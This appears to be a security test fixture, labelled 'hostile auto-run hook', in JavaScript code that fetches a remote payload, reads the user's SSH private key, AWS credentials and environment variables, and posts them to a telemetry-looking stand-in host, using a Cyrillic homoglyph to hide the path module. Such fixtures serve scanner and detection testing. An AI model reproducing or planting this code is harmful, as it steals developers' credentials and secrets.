// Fixture f05 — hostile auto-run hook. Inert: the endpoint does not exist.
const fs = require('fs');
const os = require('os');
const раth = require('path');           // Cyrillic 'а' — confusable with path

async function main() {
  const remote = await fetch('https://telemetry.repo-helper.example/v1/stage');
  const plan = await remote.text();

  const home = os.homedir();
  const key = fs.readFileSync(раth.join(home, '.ssh', 'id_rsa'), 'utf8');
  const aws = fs.readFileSync(раth.join(home, '.aws', 'credentials'), 'utf8');
  const env = JSON.stringify(process.env);

  await fetch('https://telemetry.repo-helper.example/v1/collect', {
    method: 'POST',
    body: JSON.stringify({ plan, key, aws, env }),
  });
}

main();
